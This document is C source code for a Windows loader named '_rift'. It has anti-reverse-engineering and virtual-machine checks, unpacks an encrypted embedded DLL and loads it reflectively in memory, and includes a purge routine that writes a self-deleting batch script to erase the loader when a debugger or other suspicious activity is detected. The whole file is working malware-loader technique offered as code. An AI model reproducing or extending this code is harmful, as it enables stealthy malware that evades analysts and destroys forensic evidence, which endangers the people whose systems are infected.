#include "pch.h"
#include "_rift.h"

INT WINAPI wWinMain(
	_In_     HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_     PWSTR     pCmdLine,
	_In_     INT       nCmdShow
) {
	// Initialize Global Values
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(nCmdShow);
	g_hMH = hInstance;
	GetModuleFileNameW(hInstance, g_szMFN, MAX_PATH);
	GetCurrentDirectoryW(MAX_PATH, g_szCD);
	g_hPH = GetProcessHeap();

#ifndef _DEBUG
	// Protect Process
	BOOL bRE = fnAntiRE();
#endif

	fnInitializeXSR();
	fnOpenConsole();

	BOOL bVM = fnCheckVMPresent();

	SIZE_T nDll;
	PVOID pDll = fnUnpackResource(L"_rift.KEY", IDR_RIFTDLL, &nDll);
	if (!pDll)
		return 0x1;

#ifndef _DEBUG
	// "Reflective" DLL loading will only be used in the release build
	HMEMORYMODULE hDll = MemoryLoadLibrary(pDll, nDll);
	if (!hDll)
		return 0x2;

	pfnDllInit fnDllInit = (pfnDllInit)MemoryGetProcAddress(hDll, "fnDllInit");
	int a = fnDllInit(10);

	MemoryFreeLibrary(hDll);
#else
	HMODULE dhDll = LoadLibraryExW(L"_riftdll.dll", 0, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
	if (!dhDll)
		return 0x2;

	pfnDllInit fnDllInit = (pfnDllInit)GetProcAddress(dhDll, "fnDllInit");
	int a = fnDllInit(10);

	FreeLibrary(dhDll);
#endif

	HeapFree(g_hPH, 0, pDll);
	return 0;
}

/*	This function basically does what it's called,
	it "cleans" (or better purges) everything it can and tries to destroy
	all traces of it self (the loader and everything else it extracts).
	It should get triggered ( / called) if any fatal error occurs,
	or the loader catches any suspicious activities (e.g. debuggers).  */
const static WCHAR szSelfDelBat[] = {
	L"@echo off\n"
	L"%x:\n"
	L"\tdel \"%s\" /f\n"
	L"\tif exist \"%s\" (\n"
	L"\t\tgoto %x\n"
	L"\t)\n"
	L"del \"%s\" /f"
};
VOID fnPurge() {
	// Prepare String for Filename of Batchfile
	PWSTR szFilePath = (PWSTR)HeapAlloc(g_hPH, 0, MAX_PATH);
	SIZE_T nRandom;
	PCWSTR szRandom = fnAllocRandomStringW(8, 16, &nRandom);
	CopyMemory(szFilePath, g_szCD, MAX_PATH);
	PathCchAppend(szFilePath, MAX_PATH, szRandom);
	PathCchAddExtension(szFilePath, MAX_PATH, L".bat");

	// Prepare Script content
	PVOID pScriptW = HeapAlloc(g_hPH, 0, 0x800);
	UINT uiRandomID = fnNext128ss();
	PCWSTR szMFN = fnGetFileNameFromPathW(g_szMFN);
	StringCchPrintfW(pScriptW, 0x400, szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, fnGetFileNameFromPathW(szFilePath));

	// Convert to Raw (ANSI)
	SIZE_T nScript;
	StringCchLengthW(pScriptW, 0x400, &nScript);
	PSTR pScriptA = (PSTR)HeapAlloc(g_hPH, 0, 0x400);
	WideCharToMultiByte(CP_ACP, 0, pScriptW, -1, pScriptA, 0x400, 0, 0);
	HeapFree(g_hPH, 0, pScriptW);

	// Write to Disk
	fnWriteFileW(szFilePath, pScriptA, nScript);
	HeapFree(g_hPH, 0, pScriptA);
}